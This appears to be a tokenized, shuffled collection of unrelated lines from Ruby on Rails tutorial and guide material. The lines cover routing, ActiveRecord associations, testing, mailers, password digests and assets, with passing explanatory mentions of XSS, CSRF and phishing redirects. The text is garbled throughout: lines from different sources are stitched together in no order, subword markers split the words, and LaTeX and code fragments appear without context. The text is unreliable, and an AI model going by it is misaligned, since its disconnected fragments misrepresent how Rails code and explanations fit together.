▁( You ▁won ' t ▁actually ▁see ▁the ▁ color ▁green ▁unless ▁you ▁add ▁M in i Test ▁ reporters ▁in ▁the ▁optional ▁Section ~\ ref { sec : minitest _ reporters } ▖)
▁To ▁accomplish ▁this ▁ fe at , ▁we ▁will ▁need ▁some ▁fai r ly ▁advanced ▁Rails , ▁Ruby , ▁and ▁even ▁SQL ▁programming ▁technique s .
▁redirect _ to (@ book )
▁The ▁beginning ▁is ▁different , ▁though ; ▁unlike ▁account ▁activation , ▁implement ing ▁password ▁resets ▁requires ▁both ▁a ▁change ▁to ▁one ▁of ▁our ▁views ▁and ▁two ▁new ▁forms ▁( to ▁handle ▁email ▁and ▁new ▁password ▁submission ) .
▁The ▁` extending ` ▁method ▁specifie s ▁a ▁named ▁module ▁to ▁extend ▁the ▁association ▁ proxy ▖
▁* ▁` config ▖ action _ mailer ▖ interceptor s ` ▁ register s ▁ interceptor s ▁which ▁will ▁be ▁called ▁before ▁mail ▁is ▁sent .
▁2 ▁rows ▁in ▁set ▁(0▖00 ▁ sec )
▁Otherwise , ▁if ▁the ▁return ▁value ▁contains ▁a ▁XSS ▁string , ▁the ▁ malicious ▁code ▁will ▁be ▁executed ▁upon ▁return ▁to ▁the ▁browser ▖
▁< b > Z one ▁name </ b >< br >
▁Here ▁the ▁\ k ode { header } ▁tag ▁indicates ▁elements ▁that ▁should ▁go ▁at ▁the ▁to p ▁of ▁the ▁page .
▁There ' s ▁a ▁special ▁method ▁for ▁testing ▁for ▁\ k ode { nil } - ness , ▁which ▁you ▁m ight ▁be ▁able ▁to ▁guess :
▁For ▁example , ▁you ▁m ight ▁have ▁a ▁view ▁that ▁look s ▁like ▁this :
▁But ▁the ▁complex ity ▁and ▁ sh e er ▁amount ▁of ▁code ▁in ▁the ▁scaffold ing ▁can ▁be ▁ u tt er ly ▁over w h el m ing ▁to ▁a ▁beginning ▁Rails ▁developer ; ▁you ▁may ▁be ▁able ▁to ▁use ▁it , ▁but ▁you ▁ probably ▁won ' t ▁understand ▁it .
▁The ▁\ k ode { flash ▖ now } ▁method ▁is ▁used ▁for ▁flash ▁messages ▁on ▁rendered ▁pages .
▁* ▁` config ▖ action _ controller ▖ default _ cha r set ` ▁specifie s ▁the ▁default ▁character ▁set ▁for ▁all ▁render s ▖
▁When ▁a ▁user ▁requests ▁a ▁password ▁reset , ▁find ▁the ▁user ▁by ▁the ▁submitted ▁email ▁address .
▁ s ▖ add _ dependency ▁" m oo "
▁By ▁running ▁the ▁test ▁suite , ▁verify ▁that ▁the ▁implementation s ▁in ▁Listing ~\ ref { code : token _ digest _ self } ▁( slightly ▁confusing ) ▁and ▁Listing ~\ ref { code : token _ digest _ class _ self } ▁( extremely ▁confusing ) ▁are ▁correct .
▁adapter : ▁ j db c postgresql
▁" bar " ▁: ▁" baz "
▁a 2 ▁= ▁A ▖ new
▁# ▁: uglifier ▁config ▖ assets ▖ css _ compressor ▁= ▁: yui
▁It ▁is ▁possible , ▁though , ▁using ▁a ▁special ▁test ▁method ▁called ▁\ k ode { assigns } .
▁<%= ▁comment ▖ comment er ▁%>
▁def ▁# { severity ▖ downcase } ?
▁T h r ough out ▁the ▁rest ▁of ▁this ▁chapter , ▁you ▁m ight ▁find ▁it ▁helpful ▁to ▁consult ▁the ▁\ href { http :// ruby - doc ▖ org /}{ Ruby ▁API } ▖ ▁It ' s ▁pa c k ed ▁( p erhaps ▁even ▁\ emph { to o } ▁pa c k ed ) ▁with ▁information ; ▁for ▁example , ▁to ▁learn ▁more ▁about ▁Ruby ▁strings ▁you ▁can ▁look ▁at ▁the ▁Ruby ▁API ▁entry ▁for ▁the ▁\ k ode { String } ▁class .
▁To ▁test ▁the ▁behavior ▁from ▁Listing ~\ ref { code : login _ upon _ signup }, ▁we ▁can ▁add ▁a ▁line ▁to ▁the ▁test ▁from ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission } ▁to ▁check ▁that ▁the ▁user ▁is ▁logged ▁in .
▁#### ▁JavaScript / CoffeeScript ▁and ▁ ERB
▁Noti ce ▁the ▁use ▁of ▁the ▁\ k ode { picture ?}\ ▁boolean ▁method ▁to ▁prevent ▁display ing ▁an ▁image ▁tag ▁when ▁there ▁isn ' t ▁an ▁image .
▁Of ▁course , ▁ requiring ▁users ▁to ▁sign ▁in ▁isn ' t ▁quite ▁enough ; ▁users ▁should ▁only ▁be ▁allow ed ▁to ▁edit ▁their ▁\ emph { own } ▁information .
▁You ▁can ▁also ▁extend ▁these ▁objects ▁through ▁ anonymous ▁module s , ▁adding ▁new ▁find ers , ▁ creator s , ▁or ▁other ▁methods ▖
▁NOTE : ▁ Regular ▁forms ▁generate ▁hidden ▁fields ▁so ▁they ▁do ▁not ▁use ▁these ▁tags ▖
▁< a ▁ href ="# " ▁on click =" paintIt ( this , ▁' # 0 000 99 ', ▁' # FFFFFF ') "> P aint ▁it ▁b l ue </ a >
▁P lease ▁use ▁the ▁contents ▁of ▁any ▁existing ▁file ▁in ▁` config / environments ` ▁as ▁a ▁starting ▁point ▁and ▁make ▁the ▁necessary ▁changes ▁from ▁there .
▁A ge : ▁ 88 58 14
▁Web ▁browsers ▁can ' t ▁actually ▁issue ▁\ text tt { DELETE } ▁requests ; ▁Rails ▁fake s ▁it ▁with ▁JavaScript .
▁ Adding ▁an ▁\ k ode { authenticated ?}\
▁Rails ▁4▖1 ▁evaluate s ▁each ▁fixture ' s ▁ ERB ▁in ▁a ▁separate ▁context , ▁so ▁helper ▁methods ╼ defined ▁in ▁a ▁fixture ▁will ▁not ▁be ▁available ▁in ▁other ▁fixtures .
▁@ article ▁= ▁Article ▖ new ( article _ params )
▁has _ one ▁: guest
▁With ▁this ▁sub st it u tion , ▁the ▁correct ed ▁application ▁code ▁appears ▁as ▁in ▁Listing ~\ ref { code : correct _ signin _ failure } .
▁You ▁can ▁ force ▁it ▁to ▁use ▁ Builder ▁instead ▁with ▁the ▁`: type ` ▁option :
▁ ================ ================
▁The ▁final ▁piece ▁of ▁the ▁p u z z le ▁is ▁to ▁verify ▁that ▁a ▁given ▁remember ▁token ▁matches ▁the ▁user ' s ▁remember ▁digest , ▁and ▁in ▁this ▁context ▁there ▁are ▁a ▁couple ▁of ▁equivalent ▁ways ▁to ▁use ▁ bcrypt ▁to ▁verify ▁a ▁match .
▁We ▁can ▁now ▁start ▁\ k ode { guard } ▁as ▁follows :
▁( H a v ing ▁so ▁much ▁code ▁in ▁each ▁branch ▁of ▁the ▁\ k ode { if } - \ k ode { else } ▁ condition al ▁is ▁a ▁bit ▁me s sy , ▁and ▁clean ing ▁it ▁up ▁using ▁partials ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ creating _ microposts })▖)
▁The ▁final ▁implementation ▁of ▁\ k ode { from \_ users \_ followed \_ by } .
▁When ▁you ▁call ▁` form _ for `, ▁you ▁pass ▁it ▁an ▁identify ing ▁object ▁for ▁this ╼ form ▖
▁To ▁do ▁this , ▁change ▁the ▁` new ` ▁and ▁` create ` ▁actions ▁inside ╼` app / controllers / articles _ controller ▖ rb ` ▁to ▁these :
▁User ▖ where ( week ly _ s ub s c ri b er : ▁true )▖ find _ each ▁do ▁| user |
▁In ▁addition , ▁passing ▁in ▁a ▁raw ▁\ k ode { params } ▁hash ▁as ▁above ▁will ▁cause ▁an ▁error ▁to ▁be ▁raised , ▁so ▁that ▁Rails ▁applications ▁are ▁now ▁ im m un e ▁to ▁ mass ▁assignment ▁vulnerabilities ▁by ▁default .
▁( E ve n ▁testing ▁for ▁the ▁right ▁key , ▁much ▁less ▁the ▁text , ▁is ▁likely ▁to ▁be ▁brittle , ▁so ▁I ▁prefer ▁only ▁to ▁test ▁that ▁the ▁flash ▁isn ' t ▁empty ▖)
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁" nested " ▁=> ▁{" a " ▁=> ▁3 , ▁5 ▁=> ▁ 5}} ▖ deep _ symbolize _ keys
▁Of ▁course , ▁ knowledg e ▁of ▁this ▁inheritance ▁doesn ' t ▁do ▁any ▁good ▁unless ▁we ▁know ▁what ▁\ k ode { ActiveRecord :: Base } ▁contains , ▁so ▁let ' s ▁get ▁started ▁with ▁some ▁con c re te ▁examples .
▁The ▁\ k ode { current _ user ?}
▁` ActiveRecord :: Base # to _ param ` ▁returns ▁the ▁` id ` ▁of ▁a ▁model , ▁but ▁you ▁can ▁re define ▁that ▁method ▁in ▁your ▁models ▖
▁% w ( a ▁b ▁c ▁d )▖ th ir d ▁# ▁=> ▁c
▁This ▁example ▁is ▁taken ▁from ▁` ActionDispatch :: Http :: Cache :: Response `:
▁This ▁shows ▁how ▁to ▁run ▁a ▁specific ▁test ▁within ▁a ▁test ▁file ▁by ▁passing ▁the ▁option
▁WARNING ▖ ▁Note ▁that ▁the ▁regular ▁expression ▁above ▁allows ▁a ▁ tr ailing ▁new line ╼ character .
▁### ▁` atomic _ write `
▁group (" date ( created _ at ) ")▖ having (" sum ( price ) ▁> ▁? ", ▁100 )
▁Do c rails ▁is ▁only ▁used ▁for ▁ isolate d ▁documentation ▁improve ment s .
▁( Note ▁that ▁\ k ode { eq } ▁is ▁an ▁RSpec ▁method ▁to ▁test ▁equal ity ▖)
▁if ▁options [: field s ] ▖ any ? {
▁does ▁the ▁trick ▁in ▁this ▁case ▖)
▁has _ many ▁: ads
▁ ice ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - d 0 b b fe ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁using _ form _ for ▁( end )╼╼ ▁\ subsection { Sign up ▁form ▁HTML } ▁% ▁( fold )╼ ▁\ label { sec : the _ form _ html }╼╼
▁* ▁` auto b uffer : ▁true `, ▁the ▁ video ▁will ▁pre ▁load ▁the ▁file ▁for ▁the ▁user ▁on ▁page ▁load .
▁| ▁GET ▁| ▁ / sekret / comments / : id (▖ : format ) ▁| ▁comments # show ▁| ▁comment _ path ▁|
▁If ▁the ▁string ▁evaluate s ▁to ▁no ▁known ▁constant , ▁or ▁its ▁content ▁is ▁not ▁even ▁a ▁valid ▁constant ▁name , ▁` constantize ` ▁raise s ▁` NameError ` .
▁But ▁visit ing ▁the ▁edit ▁page ▁only ▁tests ▁the ▁ authorization ▁for ▁the ▁\ k ode { edit } ▁action , ▁not ▁for ▁\ k ode { update } .
▁In ▁particular , ▁because ▁we ▁access ▁microposts ▁through ▁their ▁ associated ▁users , ▁both ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁must ▁require ▁users ▁to ▁be ▁logged ▁in .
▁No ▁problem , ▁you ▁can ▁easily ▁override ╼ the ▁default ▁convention s .
▁ strip _ tags (" < b > Bo ld </ b > ▁no ▁more !
▁De s p ite ▁its ▁apparent ▁simplicity , ▁making ▁static ▁pages ▁is ▁a ▁high ly ▁in str u c tive ▁exercise , ▁rich ▁in ▁implications --- a ▁ perfect ▁start ▁for ▁our ▁ na s c ent ▁application .
▁create ▁app / controllers / users _ controller ▖ rb
▁#### ▁Set ▁up ▁a ▁CDN ▁to ▁S er ve ▁Static ▁ Asset s
▁Now ▁get ▁b us y ▁and ▁add / edit ▁code ▖
▁Resource ▁ Routing : ▁the ▁Rails ▁ Default
▁ String s ▁also ▁respond ▁to ▁the ▁\ k ode { empty ?}\ ▁method :
▁The ▁two ▁lines ▁in ▁Listing ~\ ref { code : bootstrap _ css } ▁include ▁the ▁entire ▁Bootstrap ▁CSS ▁framework .
▁Buil t - in ▁ Helpers
▁Defin ing ▁a ▁\ k ode { gravatar \_ for } ▁helper ▁method .
▁Find ing ▁a ▁user ▁to ▁follow ▖ ~\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ user _ index _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁The ▁full ▁data ▁model ▁represent ed ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : users _ migration } ▁is ▁show n ▁in ▁Figure ~\ ref { fig : user _ model _ initial } .
▁ Adding ▁image ▁upload ▁to ▁the ▁micropost ▁create ▁form .
▁There ▁is ▁a ▁we al th ▁of ▁Rails ▁resources ▁in ▁store s ▁and ▁on ▁the ▁web --- in de ed , ▁the ▁supply ▁is ▁so ▁rich ▁that ▁it ▁can ▁be ▁over w h el m ing .
▁The ▁public ▁path ▁that ▁Sprockets ▁uses ▁by ▁default ▁is ▁` / assets ` .
▁To ▁make ▁the ▁password ▁digest , ▁\ k ode { has \_ secure \_ password } ▁uses ▁a ▁state - of - the - ar t ▁hash ▁function ▁called ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / B crypt } { bcrypt } .
▁ Sign ▁in
▁To ▁update ▁our ▁database ▁with ▁the ▁new ▁data ▁model , ▁we ▁need ▁to ▁run ▁a ▁migration ▁as ▁in ▁Section ~\ ref { sec : demo _ users _ resource } :
▁As ▁with ▁the ▁\ k ode { admin } ▁attribute ▁( Listing ~\ ref { code : admin _ migration }), ▁we ' ll ▁add ▁a ▁default ▁boolean ▁value ▁of ▁\ k ode { false } ▁to ▁the ▁\ k ode { activated } ▁attribute , ▁as ▁show n ▁in ▁in ▁Listing ~\ ref { code : add _ activation _ to _ users _ migration } .
▁now ▖ all _ week
▁Or , ▁" w ha a at ▁my ▁tests ▁are ▁failing ! ! ! ? "
▁The ▁corresponding ▁partial ▁appears ▁in ▁Listing ~\ ref { code : micropost _ partial } .
▁containing ▁the ▁name ▁of ▁the ▁test ▖ ▁( A ▁test ' s ▁name ▁is ▁just ▁the ▁word ▁`` test '' ▁and ▁the ▁words ▁in ▁the ▁test ▁ description ▁join ed ▁using ▁ underscore s ▖)
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁in ▁ delimited ▁form :
▁In cidentally , ▁the ▁order ▁of ▁the ▁sample ▁users ▁in ▁Figure ~\ ref { fig : heroku _ sample _ users } ▁may ▁var y , ▁and ▁on ▁my ▁system ▁doesn ' t ▁match ▁the ▁local ▁version ▁from ▁Figure ~\ ref { fig : user _ index _ pagination } ; ▁this ▁is ▁because ▁we ▁have n ' t ▁specified ▁a ▁default ▁ ordering ▁for ▁users ▁when ▁retrieved ▁from ▁the ▁database , ▁so ▁the ▁current ▁order ▁is ▁database - dependent .
▁The ▁user ▁profile ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) ▁with ▁microposts ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ profile _ with _ microposts _ bootstrap - full ▖ png }{( full ▁size )}
▁invoke ▁ jbuilder
▁But ▁what ▁if ▁you ▁want ▁to ▁ reload ▁the ▁cache , ▁because ▁data ▁m ight ▁have ▁been ▁changed ▁by ▁some ▁other ▁part ▁of ▁the ▁application ?
▁ private
▁In ▁particular , ▁we ▁want ▁to ▁change ▁the ▁default ▁page , ▁the ▁\ emph { root ▁route }, ▁which ▁determine s ▁the ▁page ▁that ▁is ▁served ▁on ▁the ▁\ emph { root ▁URL } .
▁A long ▁the ▁way , ▁we ' ll ▁learn ▁about ▁ po p ul ating ▁the ▁database ▁with ▁sample ▁users ▁and ▁\ emph { p a g in ating } ▁the ▁user ▁output ▁so ▁that ▁the ▁index ▁page ▁can ▁ scale ▁up ▁to ▁display ▁a ▁ potentially ▁large ▁number ▁of ▁users .
▁After ▁ submitting ▁the ▁form , ▁push ▁up ▁your ▁first ▁application ▁as ▁follows :
▁The ▁`: source _ type ` ▁option ▁specifie s ▁the ▁source ▁association ▁type ▁for ▁a ▁` has _ many ▁: through ` ▁association ▁that ▁proceed s ▁through ▁a ▁ polymorphic ▁association .
▁assemblies ▖ create !( attributes ▁= ▁{})
▁use ▁Rack :: Head
▁When ▁you ▁declare ▁a ▁` belongs _ to ` ▁association , ▁the ▁declar ing ▁class ▁automatically ▁gain s ▁f ive ▁methods ▁related ▁to ▁the ▁association :
▁ ╼ ▁( Not ▁ Y e t ▁Implement ed )
▁To ▁see ▁the ▁results ▁of ▁the ▁templates ▁defined ▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and ▁\ line break ▁Listing ~\ ref { code : account _ activation _ view _ html }, ▁we ▁can ▁use ▁\ emph { email ▁ preview s }, ▁which ▁are ▁special ▁URLs ▁expose d ▁by ▁Rails ▁to ▁let ▁us ▁see ▁what ▁our ▁email ▁messages ▁look ▁like .
▁There ' s ▁an ▁important ▁difference , ▁though ; ▁Ruby ▁won ' t ▁ interpolate ▁into ▁single - quot ed ▁strings :
▁<%= ▁f ▖ text _ field ▁: name ▁%>
▁ atom _ feed ▁do ▁| feed |
▁Using ▁the ▁\ k ode { full \_ title } ▁helper ▁in ▁a ▁test ▖
▁This ▁will ▁return ▁a ▁number ▁( possibl y ▁a ▁ float ing ▁point ▁number ▁such ▁as ▁3▖1 4 15 92 6 5 ) ▁represent ing ▁the ▁a verage ▁value ▁in ▁the ▁field .
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁Figure ~\ ref { fig : demo _ new _ micropost } .
▁# ▁< author ed - timestamp ▁type =" datetime "> 200 9 - 0 9 - 02 T 16 : 44 : 36 Z </ author ed - timestamp >
▁For ▁example , ▁on ▁my ▁system ▁I ▁visit ed ▁the ▁URL
▁If ▁the ▁ parent ▁object ▁( the ▁one ▁declar ing ▁the ▁` has _ and _ belongs _ to _ many ` ▁association ) ▁is ▁un save d ▁( that ▁is , ▁` new _ record ?` ▁returns ▁` true ` ) ▁then ▁the ▁ child ▁objects ▁are ▁not ▁saved ▁when ▁they ▁are ▁added ▖
▁This ▁would ▁cause ▁the ▁routing ▁to ▁recognize ▁paths ▁such ▁as :
▁NOTE : ▁The ▁example ▁above ▁uses ▁a ▁custom ▁environment ▁called ▁" staging " ▁for ▁a ╼ production ▁like ▁server ▁but ▁for ▁testing ▁purposes ▖
▁* ▁In ▁general , ▁views ▁will ▁be ▁rendered ▁in ▁the ▁` main ` ▁layout
▁| ▁POST ▁| ▁ / photos ▁| ▁images # create ▁| ▁photos _ path ▁|
▁The ▁view ▁for ▁the ▁user ▁index .
▁( For ▁more ▁on ▁\ k ode { curl }, ▁see ▁\ href { http :// c onquering the command line ▖ com / book / curl } { Chapter ▁3 ▁of ▁\ emph { C onquering ▁the ▁Command ▁L in e } } ▖)
▁* ▁` after _ remove `
▁#### ▁` deep _ merge ` ▁and ▁` deep _ merge !
▁validates ▁: b io , ▁length : ▁ { ▁ maximum : ▁50 0 ▁ }
▁### ▁D up li cat ing
▁gem ▁' therubyracer '
▁in ▁Listing ~\ ref { code : initial _ create _ session } .
▁(\ emph { Note } : ▁If ▁you ▁complete d ▁the ▁exercise ▁corresponding ▁to ▁Listing ~\ ref { code : base _ title _ test }, ▁you ▁should ▁re tain ▁the ▁\ k ode { setup } ▁method ▁defin ing ▁the ▁\ k ode {@ base \_ title } ▁variable ▖)
▁do _ stuff
▁Return ing ▁to ▁the ▁console , ▁we ▁can ▁see ▁the ▁effect ▁of ▁\ k ode { has \_ secure \_ password } ▁from ▁Listing ~\ ref { code : password _ implementation } ▁by ▁look ing ▁at ▁the ▁\ k ode { password \_ digest } ▁attribute :
▁* ▁The ▁[ # rubyonrails ]( irc :// irc ▖ free n ode ▖ net / # rubyonrails ) ▁ cha n n el ▁on ▁ irc ▖ free n ode ▖ net
▁As ▁you ▁can ▁see , ▁the ▁\ k ode { map } ▁method ▁returns ▁the ▁result ▁of ▁apply ing ▁the ▁given ▁block ▁to ▁each ▁element ▁in ▁the ▁array ▁or ▁ range .
▁class ▁ Picture ▁< ▁ActiveRecord :: Base
▁invoke ▁test _ unit
▁Note ▁that ▁this ▁block ▁ _ will _ ▁be ▁run ▁for ▁rake ▁task s ▖
▁#### # ▁`: through `
▁We ' ll ▁start ▁with ▁the ▁existing ▁user :
▁( If ▁the ▁repetition ▁of ▁the ▁base ▁title ▁`` Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App '' ▁both ers ▁you , ▁see ▁the ▁ exercises ▁in ▁Section ~\ ref { sec : static _ pages _ exercises } ▖)
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁day s ▁that ▁defaults ▁to ▁the ▁number ▁given
▁If ▁you ▁want ▁to ▁find ▁the ▁ sum ▁of ▁a ▁field ▁for ▁all ▁records ▁in ▁your ▁table ▁you ▁can ▁call ▁the ▁` sum ` ▁method ▁on ▁the ▁class ▁that ▁ rel ate s ▁to ▁the ▁table ▖
▁<%= ▁submit _ tag ▁' Create ' ▁%>
▁create ▁app / views / microposts / index ▖ json ▖ jbuilder
▁Let ' s ▁add ▁a ▁method ▁called ▁` welcome _ email `, ▁that ▁will ▁send ▁an ▁email ▁to ▁the ▁user ' s ╼ register ed ▁email ▁address :
▁in ▁Listing ~\ ref { code : g en er al _ authenticated _ p } .
▁In ▁our ▁case , ▁the ▁About ▁page ▁will ▁first ▁need ▁an ▁action ▁called ▁\ k ode { about } ▁in ▁the ▁StaticPages ▁controller .
▁A lthough ▁the ▁same ▁partial ▁will ▁be ▁rendered ▁into ▁both ▁views , ▁Action ▁View ' s ▁submit ▁helper ▁will ▁return ▁" Create ▁ Z one " ▁for ▁the ▁new ▁action ▁and ▁" Update ▁ Z one " ▁for ▁the ▁edit ▁action .
▁### ▁Ajax ▁Injection
▁They ▁could ▁redirect ▁to ▁a ▁ ph is h ing ▁site ▁that ▁look s ▁the ▁same ▁as ▁your s , ▁but ▁as k ▁to ▁login ▁again ▁( and ▁send s ▁the ▁login ▁credentials ▁to ▁the ▁attacker )▖
▁First , ▁we ▁will ▁need ▁to ▁know ▁about ▁the ▁do ll ar - sign ▁syntax ▁to ▁access ▁a ▁ DOM ▁element ▁base d ▁in ▁its ▁unique ▁CSS ~ id .
▁If ▁your ▁application ▁is ▁using ▁an ▁"/ assets " ▁route ▁for ▁a ▁resource ▁you ▁may ▁want ▁change ▁the ▁prefix ▁used ▁for ▁assets ▁to ▁avoid ▁conflicts :
▁First - time ▁repository ▁setup
▁### ▁Method ▁De le g ation
▁( Compar e ▁this ▁to ▁the ▁original ▁generation ▁of ▁the ▁\ k ode { users } ▁table ▁in ▁Listing ~\ ref { code : generate _ user _ model }, ▁which ▁included ▁the ▁arguments ▁\ k ode { name : string } ▁and ▁\ k ode { email : string } ▖)
▁Ju st ▁like ▁` where ` ▁clause s ▁scope s ▁are ▁merge d ▁using ▁` AND ` ▁conditions .
▁NOTE : ▁Because ▁you ▁m ight ▁want ▁to ▁use ▁the ▁same ▁controller ▁for ▁a ▁ singular ▁route ▁( ` / account ` ) ▁and ▁a ▁plural ▁route ▁( ` / account s / 45 ` ), ▁ singular ▁resources ▁map ▁to ▁plural ▁controllers ▖
▁#### ▁collection _ check _ box es
▁S ince ▁gems ▁with ▁different ▁version ▁number s ▁some times ▁ conflict , ▁it ▁is ▁often ▁convenient ▁to ▁create ▁separate ▁\ emph { gem set s }, ▁which ▁are ▁self - contain ed ▁bundle s ▁of ▁gems .
▁When ▁learning ▁about ▁classes , ▁it ' s ▁useful ▁to ▁find ▁out ▁the ▁\ emph { class ▁hierarchy } ▁using ▁the ▁\ k ode { super class } ▁method :
▁This ▁includes ▁link ing ▁to ▁a ▁blank ▁string ▖
▁ / microposts /1
▁In ▁order ▁to ▁get ▁the ▁user ▁show ▁view ▁to ▁work , ▁we ▁need ▁to ▁define ▁an ▁\ k ode {@ user } ▁variable ▁in ▁the ▁corresponding ▁\ k ode { show } ▁action ▁in ▁the ▁Users ▁controller .
▁wrong ▁password
▁in ▁Listing ~\ ref { code : full _ title _ helper _ tests } .
▁The ▁more ▁prepar ed ▁statement s ▁in ▁use : ▁the ▁more ▁memory ▁your ▁database ▁will ▁require ▖
▁To ▁display ▁the ▁users ▁themselves , ▁we ▁need ▁to ▁make ▁a ▁variable ▁containing ▁all ▁the ▁site ' s ▁users ▁and ▁then ▁render ▁each ▁one ▁by ▁it er ating ▁through ▁them ▁in ▁the ▁index ▁view .
▁ Adding ▁code ▁to ▁test ▁the ▁contents ▁of ▁the ▁About ▁page .
▁**` ActionDispatch :: ParamsParser ` **
▁For ▁example , ▁` type ` ▁is ▁a ▁re serv ed ▁keyword ▁used ▁to ▁design ate ▁a ▁table ▁using ▁S ing le ▁Table ▁In her it ance ▁( ST I )▖
▁How ▁ detailed ▁you ▁want ▁to ▁make ▁your ▁tests ▁is ▁up ▁to ▁you ; ▁a ▁suggest ed ▁template ▁appears ▁in ▁Listing ~\ ref { code : flash _ test } .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / enumerable ▖ rb ` .
▁create _ customer !
▁It ' s ▁also ▁useful ▁for ▁insert ing ▁tags ▁that ▁load ▁page - specific ▁JavaScript ▁or ▁ css ▁files ▁into ▁the ▁header ▁of ▁an ▁otherwise ▁generic ▁layout .
▁ Engine s ▁and ╼ application s ▁also ▁share ▁a ▁common ▁structure .
▁If ▁you ▁find ▁yourself ▁getting ▁b ogg ed ▁down ▁by ▁the ▁tests , ▁I ▁suggest ▁either ▁skip p ing ▁them ▁on ▁a ▁first ▁reading ▁or ▁( even ▁better ) ▁using ▁them ▁as ▁a ▁tool ▁to ▁verify ▁your ▁code ' s ▁correct ness ▁without ▁worry ing ▁about ▁how ▁they ▁work .
▁Because ▁we ▁won ' t ▁necessar ily ▁have ▁access ▁to ▁a ▁user ▁object ▁when ▁calculat ing ▁the ▁digest ▁( as ▁will ▁be ▁the ▁case ▁in ▁the ▁fixtures ▁file ), ▁we ' ll ▁a tt a ch ▁the ▁\ k ode { digest } ▁method ▁to ▁the ▁User ▁class ▁itself , ▁which ▁( as ▁we ▁saw ▁brief ly ▁in ▁Section ~\ ref { sec : const ru c to rs }) ▁make s ▁it ▁a ▁\ emph { class ▁method } .
▁If ▁you ▁want ▁them ▁to ▁run ▁in ▁other ▁ environments ▁consult ▁the
▁# ▁You ▁cannot ▁reach ▁it ▁via ▁the ▁constant ▁M ▁because ▁it ▁does ▁not ▁even ▁exist .
▁So , ▁to ▁get ▁the ▁test ▁suite ▁passing ▁again , ▁we ▁just ▁need ▁to ▁add ▁a ▁password ▁and ▁its ▁confirmation , ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ with _ password _ confirmation } .
▁This ▁example ▁ assumes ▁you ▁are ▁using ▁Ruby ~ 1▖9▖3 .
▁This ▁uses ▁the ▁\ k ode { have \_ title } ▁method , ▁which ▁check s ▁for ▁an ▁HTML ▁title ▁with ▁the ▁given ▁content .
▁Create ▁a ▁micropost ▁(\ k ode { user \_ id ▁= ▁user ▖ id }) .
▁else
▁page ▁to ▁edit ▁micropost ▁with ▁id ▁\ k ode {1}
▁create ▁app / views / microposts / index ▖ html ▖ erb
▁email = michael %40 michael hartl ▖ com "> Activ ate </ a >╼ - --- == _ mime part _ 5407704 656 b 50 _ 6 1 d 3 fd 19 14 f 4 cd 02 99 6 a - -
▁They ▁are ▁important , ▁though , ▁and ▁I ▁suggest ▁learning ▁about ▁them ▁using ▁one ▁of ▁the ▁Ruby ▁ books ▁recommended ▁in ▁Section ~\ ref { sec : comments _ for _ various _ reader s } .
▁The ▁signup ▁form ▁\ href { http :// localhost :3000/ signup }{/ signup } ▁for ▁new ▁users ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ form _ bootstrap - full ▖ png }{( full ▁size )}
▁When ▁you ▁declare ▁a ▁` has _ many ` ▁association , ▁the ▁declar ing ▁class ▁automatically ▁gain s ▁ 16 ▁methods ▁related ▁to ▁the ▁association :
▁The ▁way ▁to ▁change ▁the ▁links ▁in ▁the ▁site ▁layout ▁involve s ▁using ▁an ╼ if - else ▁statement ▁inside ▁ embedded ▁Ruby ▁to ▁show ▁one ▁set ▁of ▁links ▁if ▁the ▁user ▁is ▁logged ▁in ▁and ▁another ▁set ▁of ▁links ▁otherwise :
▁" dude "▖ pluralize (0) ▁# ▁=> ▁" dude s "
▁This ▁code ▁arrange s ▁to ▁include ▁the ▁application ▁stylesheet ▁and ▁JavaScript , ▁which ▁are ▁part ▁of ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : the _ asset _ pipeline }), ▁together ▁with ▁the ▁Rails ▁method ▁\ k ode { csrf \_ meta \_ tags }, ▁which ▁prevent s ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / C ross - site _ request _ forgery } { cross - site ▁request ▁ forgery } ▁( CSRF ), ▁a ▁type ▁of ▁ malicious ▁web ▁attack .
▁\ emph { Hint } : ▁See ▁the ▁\ href { http :// r ailscasts ▖ com / episodes / 27 0 - authentication - in - rails - 3- 1 } { RailsCast ▁on ▁authentication ▁in ▁Rails ~ 3▖1 }, ▁and ▁note ▁in ▁particular ▁the ▁change ▁in ▁the ▁structure ▁of ▁the ▁\ k ode { params } ▁hash .
▁With ▁these ▁technique s ▁in ▁hand , ▁we ▁are ▁well - equ ip ped ▁to ▁re c over ▁from ▁the ▁in evi table ▁development ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / S N A F U } { s na f us } .
▁S ince ▁GitHub ▁charg es ▁for ▁ private ▁repositories ▁while ▁Bitbucket ▁offer s ▁an ▁un limited ▁number ▁for ▁free , ▁for ▁our ▁purposes ▁Bitbucket ▁is ▁a ▁better ▁fit ▁than ▁GitHub .
▁If ▁you ▁add ▁an ▁` erb ` ▁extension ▁to ▁a ▁JavaScript ▁asset , ▁making ▁it ▁something ▁such ▁as ╼` application ▖ js ▖ erb `, ▁you ▁can ▁then ▁use ▁the ▁` asset _ path ` ▁helper ▁in ▁your ╼ JavaScript ▁code :
▁The ▁current ▁authentication ▁tests ▁check ▁that ▁navigation ▁links ▁such ▁as ▁`` Pro file '' ▁and ▁`` Settings '' ▁appear ▁when ▁a ▁user ▁is ▁signed ▁in .
